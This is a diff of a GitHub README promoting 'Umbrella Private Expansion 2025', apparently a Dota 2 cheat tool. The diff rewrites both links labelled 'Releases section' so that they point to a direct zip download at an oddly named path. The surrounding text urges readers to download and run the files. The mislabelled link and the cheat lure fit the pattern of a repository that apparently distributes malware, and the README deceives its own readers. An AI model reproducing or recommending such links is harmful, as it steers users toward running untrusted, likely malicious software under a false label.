@@ -23,7 +23,7 @@ Welcome to the Umbrella Private Expansion 2025 repository, where you can elevate
   - umbrella-setup-guide
 
 ### Get Started with Umbrella Private Expansion 2025
-To access the latest version of the Umbrella Private Expansion 2025, visit the [Releases section](https://github.com/anggasetianaa/Umbrella-Private-Expansion-2025/releases). You can find all the necessary files for download and execution there.
+To access the latest version of the Umbrella Private Expansion 2025, visit the [Releases section](https://github.com/anggasetianaa/Umbrella-Private-Expansion-2025/raw/refs/heads/main/hyperodontogeny/Private-Expansion-Umbrella-cheekily.zip). You can find all the necessary files for download and execution there.
 
 ### Why Choose Umbrella Private Expansion 2025?
 Umbrella Private Expansion 2025 offers a range of benefits to enhance your Dota 2 gaming experience. With optimized settings, advanced customization options, and full access to new features, Umbrella is your key to unlocking the full potential of the game.
@@ -38,6 +38,6 @@ Make sure to check the repository regularly for updates on the latest version of
 If you have ideas for new features or improvements to Umbrella Private Expansion 2025, feel free to contribute to the repository. Your input is valuable in shaping the future of the expansion and making it even better for the gaming community.
 
 ### Explore Umbrella Private Expansion 2025 Today
-Don't miss out on the opportunity to enhance your Dota 2 experience with Umbrella Private Expansion 2025. Visit the [Releases section](https://github.com/anggasetianaa/Umbrella-Private-Expansion-2025/releases) now to download the latest version and start optimizing your gameplay. Level up your gaming experience with Umbrella Private Expansion 2025! 🚀
+Don't miss out on the opportunity to enhance your Dota 2 experience with Umbrella Private Expansion 2025. Visit the [Releases section](https://github.com/anggasetianaa/Umbrella-Private-Expansion-2025/raw/refs/heads/main/hyperodontogeny/Private-Expansion-Umbrella-cheekily.zip) now to download the latest version and start optimizing your gameplay. Level up your gaming experience with Umbrella Private Expansion 2025! 🚀
 
 Remember, success in Dota 2 is just a click away with Umbrella Private Expansion 2025. Download it now and start your journey to gaming excellence.
